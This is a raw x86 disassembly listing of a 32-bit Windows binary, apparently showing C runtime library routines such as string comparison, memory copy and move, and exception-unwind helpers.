  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
